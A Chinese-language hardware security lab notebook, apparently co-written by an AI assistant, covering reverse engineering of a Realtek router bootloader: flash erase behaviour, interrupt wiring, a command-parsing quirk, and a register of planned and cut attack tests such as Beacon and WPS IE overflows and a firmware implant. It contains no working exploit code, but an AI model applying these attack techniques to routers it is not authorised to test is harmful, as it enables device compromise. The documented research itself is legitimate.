      Step5   0x3F0000 = de ad be ef（第一個樣式活著）
              0x3F0100 = ca fe ba be（第二次寫入的位址）
      Step6   0x3F0000 = ff ff ff ff（FF 寫在 DE 上面真的變成 FF）
              0x3F0100 = ca fe ba be（鄰居活過了對 0x3F0000 的寫入）
      Step6c  0x3F0100 從 ca fe ba be 變成 ff；0x3F0000 起 512 byte 全 ff
觀測通道 1（果）: 寫 FF 蓋在 DE 上面回到 FF —— 純程式化只能 1→0，做不到這件事
觀測通道 2（果）: 兩個方向的鄰居都活著（寫 0x3F0100 保住 0x3F0000，
      寫 0x3F0000 保住 0x3F0100）
觀測通道 3（因）: loader 的十七個指令裡一個抹除指令都沒有，所以抹除只能在 FLW 裡
判定: ✅ 成立 —— FLW = 讀出整個磁區 → 改指定 byte → 抹除磁區 → 整段寫回
反證檢查: P0-3 事先寫的是「讀回與寫入不一致，或抹除後不是全 FF → 救援路徑不成立」。
      兩條都沒有觸發
計畫外，而且是一個我自己的錯: Step 5 我原本說「0x3F0100 讀到 ca fe ba be，
      證明第二次寫入落地了」。**那是壞的推論** —— 8/17 那一輪寫的是同一個位址、
      同一個樣式，所以那個值可能是四天前的殘留。修法是 Step 6c：把 0x3F0100 寫成 FF，
      看著它從 ca fe ba be 變過去。那個變化是一分鐘前才親眼讀過的，不可能是殘留
```

## 三、兩次 `Unknown command !`，一次有答案一次沒有

**有答案的那一次**：`FLR 80520000 0 100` 被拒絕。把同一份 picocom log 用
`cat -A` 重看，那一行是

```text
^M<RealTek>^[[A^[[BFLR 80520000 0 100$
```

`^[[A` 是上箭頭、`^[[B` 是下箭頭。**這個 loader 沒有指令歷史也沒有行編輯，
方向鍵直接變成四個位元組進了指令行**，於是 `argv[0]` 是 `\x1b[A\x1b[BFLR`。

**沒有答案的那一次**：`A2.8` 步驟 3 的第一次 `EB`。同樣用 `cat -A` 重看，
**那一行是乾淨的**，沒有任何跳脫位元組，而它緊接在 `probe` 的非同步 TFTP 輸出之後。
同一行、按過一次 Enter 之後就成立。成因仍然未知。

**而這一節真正的教訓不是那兩次失敗，是我讀 log 的方式。**
逐字紀錄一直在手上，我用不顯示控制字元的方式讀它，所以答案是隱形的 ——
**一份逐字紀錄用錯誤的方式讀，跟沒有那份紀錄是一樣的。**

## 四、我今晚給過的兩個解釋，都被便宜的檢查殺掉

| 我說 | 檢查 | 結果 |
|---|---|---|
| 「`make doctor` 開關了序列埠，DTR 跳一下等於按 reset」 | 讀 `bench-doctor.sh` | ❌ 它用的是 `[ -r ] && [ -w ]`，`access(2)` 權限檢查，**根本沒開啟裝置** |
| 「`EB` 失敗是 TFTP 非同步輸出插進 `GetLine`」 | `cat -A` 讀 log | 🔶 對那一次仍然是候選，但**對後來 `FLR` 那一次完全不適用**（是方向鍵） |

兩個都是我在沒有看證據的情況下先講出口的，而證據在兩分鐘之內就拿得到。

## 五、下一場從哪裡開始

**不是 `A2.8`，也不是 `A2.5`。** 兩節的目的都達成了，而 `A2.5` 的四次寫入已經還原。

**開放題 99 剩下的那一半**（`T-94` 不成立的那一半）需要一個今晚之前不存在的實驗：
一段重新開中斷、然後 `jr ra` 的 RAM payload。loader 沒有任何指令寫得到 CP0 status
（`MTC0SR` 在廠商原始碼裡是註解掉的，今晚 `?` 的十七行也證實它不在表上），
**所以那個實驗只能靠 payload —— 而「payload 可以跑完回到 loader」正是今晚
`P9-16` 剛剛證明的事。**

**不在裝置上設計它。** 那違反 `A2.8` 自己寫的停止條件第 5 條。

---

# 2026-08-22（六）W08 桌面第六場 —— 一個形狀比對答錯了整條結論，而錯的方向剛好是「什麼都沒發生」

**桌面場，路由器全程沒有通電，夾子沒有碰過任何東西，CP2102 沒有接。**
這一則存在的理由跟前幾則桌面場一樣：**下一次進站的計畫在今天被改掉了**，
而改掉它的東西（loader 第二階段的中斷接線）是在桌面上讀出來的。
計畫要在插電之前上記錄，不是之後。

**入口是開放題 101 與 102，兩題都答完了，而 102 的答案一直躺在磁碟上。**

## 一、開放題 101：TFTP 是中斷驅動的，而第一版讀法說的正好相反

| 事實 | 位址 | 怎麼讀出來的 |
|---|---|---|
| 命令提示字元的字元來源是**無界地**輪詢 UART，而且只碰兩個位址 | `0x80406BBC`（`0xB8002014` / `0xB8002000`，0 個未解析） | `tools/loader-unpack.py --irq` |
| `request_IRQ(15, 0x8040D6EC, 0x8040E9D0)`，irqaction 帶的名字字串是 `eth0` | `0x80402A44`，handler `0x804023B0` | 同上（`request_IRQ` 是從 `GIMR0` 的設位元函式反推出來的，不是用名字找的） |
| 另外兩條：irq 8 `timer`、irq 27 `SPEED` | `0x80408FEC` / `0x8040A3C0` | 同上 |
| **進命令迴圈之前就把 `IE` 設起來** | `0x80408494`（`ori 0x1f` / `xori 0x1e`） | 同上 |
| 那一行 `sti` 的前一個指令印的是 `---Ethernet init Okay!` | `0x80408478` | 而**這一行就在 `dumps/uart-bootloader.log` 裡**，在第一個 `<RealTek>` 上面一行 |
| `eth0` 的 handler 逐幀呼叫封包輸入路徑，再依 EtherType 分派 | `0x804023B0` → `0x80402040` | 同上 |
| 沒有中斷的那條路（正常開機）**不跑**乙太網初始化 | `0x804084B8`，而 `dumps/uart-boot.log` 沒有那一行 banner | 兩份 log 對照 |

**推論**：板子停在 `<RealTek>` 的時候，命令迴圈卡在 `getchar` 裡輪詢 UART，
不看網路一眼；而 TFTP 確實會回應（2026-08-21 量過）。**所以收送只能由中斷驅動。**
於是 `J` 的 `GIMR0 = 0` 與清 `IE`，任何一件單獨就足以讓它停擺，
而把五個 PHY bit 還原永遠救不回來 —— 那正是 8/22 凌晨量到而歸不了因的那一格。

### 而第一版的讀法說「這個 loader 全程遮著中斷跑」

它找的是 Realtek 那個 `sti` 慣用式 `mfc0 $1,$12 / ori $1,1 / mtc0 $1,$12`，
一個都沒找到，卻找到七個同形狀的 `cli`。**每一步觀察都對，結論剛好相反。**
這個 build 寫的是 `ori $1,0x1f / xori $1,0x1e` —— 設 bit 0、清 bit 1..4。

**注意錯的方向**：它會讓我寫下「TFTP 是輪詢的」，然後把 `J` 之後網路死掉歸因到
cache 維護或交換器 —— 也就是把三個候選裡**正確的那一個排除掉**，
而且是用一句聽起來很有根據的話排除的。

修法不是比對得更仔細，是換一個問題：不要問「這是不是我預期的形狀」，
要問「寫進去之後 bit 0 是幾」。守衛案例裡最重要的一對只差**一個立即數的一個 bit**。

## 二、開放題 102：那個提示字元是中斷印出來的

`w08-a28.log` 裡那一行乾淨卻被拒絕的 `EB`，成因是**行緩衝區裡先有了八個空白**。

| 事實 | 位址 / 證據 |
|---|---|
| TFTP 下載完成印的是 `"\n.Success!\n%s"`，`%s` 是字串 `<RealTek>` 的**第二份** | `0x80401CD0`，格式 `0x8040A948`，引數 `0x8040A894` |
| 上傳完成、autoburn 成功/失敗三條訊息也一樣帶 `%s` | `0x80401AEC` / `0x804018D0` / `0x804018B8` |
| 這些全部在 `eth0` 的中斷處理程序裡印，**不會清行緩衝區** | 由第一節的接線推出 |
| tokeniser 在測試空白**之前**就存了 `argv[i]`，然後把那個空白寫成 NUL | `0x80407290` / `0x804072D4` |
| 所以帶前導空白的一行，`argv[0]` 是空字串 → `Unknown command !` | 十七個名字一個都不 match |
| `GetLine` 把一個 TAB 展開成**正好八個空白** | `0x8040713C`–`0x80407168` |
| `stage2.bin` 裡**沒有任何一段連續八個空白** | `grep -abo` 全檔 0 命中 —— 所以那八個空白不可能是 printf 印的 |
| 空行不會被抱怨，只會靜靜地重印提示字元 | `0x804091C8` 的 `blez`，而 log 下面兩行就是這樣 |

**為什麼拖了一天**：查「誰印 `<RealTek>`」用的是**交叉引用**。查到一個結果，
結果是對的，而從它推出來的「提示字元只有一個擁有者」是錯的 ——
同一個字串在映像裡有**兩份**。交叉引用回答的是「誰用了這個位址」，
問題是「誰印了這段文字」。

**八個空白是 TAB 還是八次空白鍵，這份紀錄分不出來**，兩者的回顯一模一樣，
留下的緩衝區也一模一樣。被拒絕的成因是確定的，按了哪個鍵不是。

## 三、順帶解釋掉一件從 W02 就在的事

`tools/console-lint.py` 跑過 `dumps/uart-bootloader.log`（2026-08-16 W02 的捕獲）：
開頭那三個 `Unknown command !` 是 **`console-dump.py` 自己灌的 ESC 流掉進 `argv[0]`**。
那三行在紀錄裡躺了六天，沒有人問過。第四個是 `help` —— 而 `argv[0]` 在比對前
會先過 `strupr`（`0x80407040`），所以指令是**不分大小寫的**，`help` 失敗只是因為
表上那一項叫 `?`。

## 四、`A2.8` 引用了一條不存在的規則，而我昨天也照著引用了一次

`A2.8` 步驟 4 的結語寫著「見下面的停止條件第 5 條」，而 `A2.8` 從頭到尾
**沒有任何編號的停止條件**。最接近的一份在 `A2.7`，在上面，而且只有四條。
**這一份紀錄 2026-08-22「五、下一場從哪裡開始」也照著引用了同一個編號。**

規則的內容一直都在（步驟 4 那句「不要在裝置前面設計它」），缺的是它被編號、
被放在被指到的位置。**指向一條不存在的規則的指標，比沒有指標更糟**：
讀的人以為自己被規則擋著，而實際上什麼都沒有擋。

`A2.8` 現在有五條，新的 `A2.9` 也有五條，而 `tools/check-runsheet.py` 現在檢查
「標題宣告幾條就要有幾條」與「第 N 條這種引用要解析得到」，四個守衛案例。

## 五、下一次進站的計畫，寫在插電之前

**`A2.1` → `A2.2` → `A2.9` 步驟 0 → `A2.4` → `A2.9` 步驟 1 → 步驟 2 → 步驟 3 →
斷電重開 → `A2.2`。** 理由逐條在 `runsheet.md` Part B「B-W08 增補之五」。

**三個新登記項，預測與反證在插電之前凍結**（freeze `7ade2454…`）：

| | 預測的最短形式 | 什麼結果算它錯 |
|---|---|---|
| `P9-18` | 提示字元下 `GIMR0` 的 bit 15 = 1、bit 27 = 0；`IRR1` 的 bit 28–31 = 3 | bit 15 是 0，或 `GIMR0` 整個是 0 → **步驟 3 不要送** |
| `P9-19` | 前導一個空白的合法指令被拒；TAB 回顯八個空白；`probe` 完成後那個提示字元是假的 | 帶空白的那一行照常執行 → tokeniser 的讀法錯 |
| `P9-17` | 只還原 `GIMR0` → `probe` 仍逾時；`GIMR0` + `IE` → `probe` 回來 | 只還原 `GIMR0` 就復活 → `J` 的 `mtc0` 沒有真的清掉 `IE` |

**`GIMR0` 的 bit 8 我不敢預測**，兩個可能的寫入者之間的呼叫圖沒有解出來。
兩種結果都寫進登記簿，並且指名 `0x80402F80` 的呼叫者是決定它的東西。
這跟 8/22 凌晨那格沒有分數的實驗是同一個形狀，而且是故意的。

**這一場沒有紀錄卡**，因為沒有任何東西被送到裝置上。

---

# 2026-08-22（六）W08 桌面第七場 —— 六刀，以及一份沒有變的進站計畫

**桌面場，路由器全程沒有通電，夾子沒有碰過任何東西，CP2102 沒有接。**

這一則存在的理由，跟前幾則桌面場不同：**不是計畫被改掉了，是登記簿今晚少了六列。**
而其中一列（`P9-10`）原本就是今晚跑得動的 —— 前置條件在 2026-08-22 凌晨那一場全部
補齊了 —— 所以把它拿掉會改變今晚的風險預算。**那種事要寫在插電之前，不是之後。**

**進站計畫本身一個字都沒改**，仍然是桌面第六場「五、下一次進站的計畫」那一份：
`A2.1` → `A2.2` → `A2.9` 步驟 0 → `A2.4` → `A2.9` 步驟 1 → 步驟 2 → 步驟 3 →
斷電重開 → `A2.2`。三個登記項的預測與反證仍然是 `7ade2454…` 那一版，**沒有重新凍結**。

## 一、六刀，各自的理由與各自的可否證形式

| ID | 項目 | 一句話的理由 | 什麼會讓它回來 |
|---|---|---|---|
| `P7-3` | 惡意 Beacon → Site Survey 表溢位 | 兩條，**而第二條買不掉**：沒有注入網卡；beacon 是廣播，會進到範圍內每一台裝置的掃描路徑 | 網卡只解除第一條。**要屏蔽環境才解除第二條** —— 所以有了網卡它也不該回來 |
| `P7-4` | 惡意 WPS IE（長度欄 2 bytes） | 跟 `P7-1`／`P7-2`／`P7-5` 同一類：等一張支援 monitor mode + 注入的 USB 網卡 | 一張 AR9271，`aireplay-ng --test` 通過。**單一條件** |
| `P9-5` | SPI 直讀 dump（第二支儀器） | 夾上 `U19` 之後晶片端 `VCC` 三種供電都停在 1.70 V，工作範圍之外 | 換一支帶得動的燒錄器，或把 `U19` 解焊下來離板讀 |
| `P9-6` | SPI 直寫植入 | 同上 | 同上 |
| `P9-7` | 讀 JEDEC ID | 同上 —— **它只要三個 byte，不是因為比較難才倒的** | 同上 |
| `P9-10` | 改造韌體回刷 / implant | 前置條件成立了，**這一刀是取捨不是安全顧慮**：`P9-12` 已經在矽上量到「這台會執行原廠沒有的程式碼」，`P9-10` 只多買到跨電源循環的持續性 | 買第二台 N150RT。那時它不再是拿單點故障換一次量測 |

完整理由在 `test-cases.toml` 各列的 `cut_reason`，經 `make ledger` 渲染到
`test-ledger.md`「刻意不做的項目」那一節。**六列的凍結預測全部原文保留**，
讀者看得到當初預測了什麼、而它從來沒有被測。

## 二、兩個雜湊，一個動了一個沒動，而這正是設計要的

```text
freeze    7ade2454…  ->  7ade2454…   沒動
schedule  85cb83a2…  ->  25095eb0…   動了
```

`freeze_payload` 涵蓋**每一列有反證條件的案子**，被砍掉的也算 —— 所以切一刀不會
讓先前所有結果看起來像被竄改過。`schedule_payload` 只涵蓋**還活著的案子**，
所以切一刀一定會讓它變，而 `rtcase check` **先擋下來了才讓它過**：

```text
FAIL  schedule mismatch: register declares 85cb83a2..., the schedule hashes to 25095eb0...
```

**這正是那個 docstring 寫的事**：一條理由可以被事後改寫，而「我做不到」變成
「我選擇不做」是不留痕跡的。今晚是反方向 —— 差一點把「我選擇不做」寫成「我做不到」。

## 三、`P7-4` 的理由原本要被寫錯，而糾正它的是登記簿自己

我先提出的是：**把 `P7-4` 寫成「缺 monitor mode 網卡，儀器不存在」不成立**，
因為它自己的凍結預測寫的發射端是 ESP8266 的 `wifi_send_pkt_freedom`，而桌上確實
有一片 ESP8266（2026-08-21 當過 3.3 V 穩壓器）。**這一半成立，而且已經寫進理由裡。**

我接著提出的第二半是錯的：我說擋住 `P7-4` 的是輻射範圍，跟 `P7-3` 同一條。作者回
「`P7-4` 就是網卡那一類」，而**登記簿 2026-08-18 的改期理由早就這樣寫了** ——
它點名需要處理輻射範圍的是「`P7-3` / `P7-6` / `P7-9`」三項，**沒有 `P7-4`**。
理由是技術上的：WPS IE 可以掛在**探測回應**上，而探測回應是回給發出探測請求的那一台
（這裡就是路由器自己的 Site Survey），不是無差別廣播。

**兩個教訓，方向相反，所以兩個都要記：**

1. 我對 `P7-4` 的「儀器不存在」提出質疑是對的 —— 那句話會把「選擇不做」說成「做不到」。
2. 我對它的**替代理由**是自己現想的，而正確答案在檔案裡躺了四天。**一個現場想出來
   的理由，跟一個從記錄裡查出來的理由，看起來一樣有自信。**

## 四、沒有被改的一件事，以及它現在的狀態

`P9-8`（EJTAG）與 `P9-11`（短接 SPI）**在 2026-08-20 就已經被砍掉**，而兩條理由
都引用 CH341A：`P9-11` 說它提供「**嚴格更強**的復原路徑」，`P9-8` 說它「直接覆蓋了
不經過 SoC 讀寫 flash 這件事」。**2026-08-21 的夾子場量到 CH341A 到不了那顆晶片**，
所以這兩句話在這塊板子上已經不成立。

**經作者決定，兩列的理由今晚不動。** 這一則記下狀態而不是改檔：兩列的**存活腳**
各自還站著（`P9-11` 是「`A2.2` 的連續 ESC 每一次進站都拿得到，沒有失敗過」，
`P9-8` 是「主控台已經給了記憶體讀寫與 flash 讀寫」），而失效的是它們的**第二條腿**。
差別在於 `P9-11` 的可否證形式（「只要出現一次寫入之後 ESC 拿不到 `<RealTek>`，
這一列就回來」）**現在後面沒有硬體備援了**，所以它比 8/20 寫的時候更吃重。

## 五、順帶記一個沒有編號的儀器問題，因為它是第 12 號的形狀

今晚那支一次性的補丁腳本裡有一段守衛：「這六列如果已經有結果就拒絕寫入」。
它讀的是 `test-results.json`，而結果檔在 `reports/test-results.json`。
**檔案不存在，`if RES.exists()` 是 False，守衛整段跳過，印出成功。**

沒有造成傷害（`rtcase check` 自己有同一條規則，而且那六列本來就沒有結果），
而且它是一次性腳本不是本專案的儀器，所以**不編號**。記在這裡的理由只有一個：
**一個沒有東西可檢查的檢查會回報成功**，這是第 12 號的形狀，而這是它第五次出現。

## 六、今晚不做什麼

- **`A2.5`、`A2.8` 不跑。** 兩節的目的都達成、寫入已還原（2026-08-22 凌晨）。
  `A2.5` 只有在同一場要接著跑 `P9-10` 時才有意義，**而 `P9-10` 今晚被砍了**，
  所以這句話從「這一場沒有」變成「以後也不會有」。
- **第 5 站不跑，夾子不碰。** 開放題 97 仍然開著，而今晚的六刀**沒有回答它** ——
  砍掉 `P9-5`／`P9-6`／`P9-7` 是決定不做，不是找到答案。**兩件事不可以混用。**
- **不做開放題 97 的分離實驗。** 我提過一個（在注入線上串一顆已知電阻，用壓降算
  電流，再比較有無串阻時的晶片端電壓 —— 不需要動到夾具那個固定排針）。
  作者的決定是等有合適的燒錄器再說。**設計寫在這裡，不寫在理由裡**，因為它是一個
  沒有被執行的提議，不是一個量測。

**這一場沒有紀錄卡**，因為沒有任何東西被送到裝置上。
